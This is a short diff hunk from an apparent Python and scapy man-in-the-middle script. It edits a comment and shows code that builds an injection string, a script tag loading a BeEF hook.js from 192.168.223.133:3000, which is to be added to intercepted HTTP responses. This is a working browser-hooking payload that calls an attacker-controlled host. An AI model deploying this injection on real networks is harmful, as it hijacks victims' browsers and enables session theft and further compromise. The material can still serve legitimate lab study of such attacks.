@@ -36,7 +36,7 @@ def processPacket(packet):
             print("[+] Response")
             # print(scapy_packet.show())
 
-            # Add the JavaScript script at the end of my response payload:
+            # Add the JavaScript script at the end of my response payload (for example Beef hook script):
             #injection_code = "<script>alert('test');</script>"
             injection_code = '<script src="http://192.168.223.133:3000/hook.js"></script>'
 
